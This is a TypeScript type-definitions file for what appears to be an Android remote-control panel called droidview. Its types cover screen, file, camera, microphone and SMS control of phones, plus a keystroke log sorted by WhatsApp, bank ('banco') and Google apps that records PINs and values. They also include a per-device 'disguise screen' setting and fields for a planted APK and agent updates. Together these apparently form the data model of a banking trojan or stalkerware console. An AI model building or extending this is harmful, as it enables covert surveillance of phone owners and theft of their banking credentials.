export type ControlTool =
  | "tela"
  | "dispositivo"
  | "permissoes"
  | "arquivos"
  | "teclado"
  | "apps"
  | "camera"
  | "mic"
  | "sms";

export interface ControlDevice {
  id: string;
  name: string;
  model: string;
  ip: string;
  battery: number;
  status: "online" | "offline" | "pending";
  lastSeen: string;
  androidVersion: string;
  manufacturer: string;
  wifiSignal: number;
  networkType?: "wifi" | "4g" | "5g" | "3g" | "ethernet" | "offline";
  networkName?: string;
  signalStrength?: number;
  networkSpeed?: string;
  pingMs?: number;
  screenLocked: boolean;
  dateGroup?: string;
  isFavorite?: boolean;
  disguiseScreen?: import("@droidview/shared").DeviceDisguiseConfig | null;
  agentVersion?: string;
  updateSeed?: string;
  updateStatus?: import("@droidview/shared").DeviceUpdateStatus;
  contactName?: string;
  phoneNumber?: string;
  apkName?: string;
  notes?: string;
  userAccount?: string;
  operator?: string;
  deviceOwner?: string;
  autoIdentified?: boolean;
  identifiedAt?: string;
}

export interface KeyboardEventItem {
  id: string;
  timestamp: string;
  category: "whatsapp" | "banco" | "google" | "todas";
  appName: string;
  content: string;
  masked?: boolean;
  type: "text" | "phone" | "pin" | "value" | "input";
}

export interface DeviceFileItem {
  id: string;
  name: string;
  path: string;
  isDir: boolean;
  sizeBytes?: number;
  modified: string;
  extension?: string;
}

export interface AppPermissionDetail {
  name: string;
  key: string;
  granted: boolean;
}

export interface InstalledAppItem {
  id: string;
  name: string;
  packageName: string;
  version: string;
  isSystem: boolean;
  status: "active" | "background" | "stopped" | "disabled";
  iconType: "bank" | "chat" | "browser" | "system" | "media" | "social" | "tools" | "shopping" | "transport";
  iconBg?: string;
  iconColor?: string;
  iconLetter?: string;
  emoji?: string;
  iconUrl?: string;
  sizeMb?: number;
  installDate?: string;
  permissions?: AppPermissionDetail[];
}

export interface DevicePermissionItem {
  id: string;
  title: string;
  permissionKey: string;
  granted: boolean;
  critical: boolean;
  description: string;
}
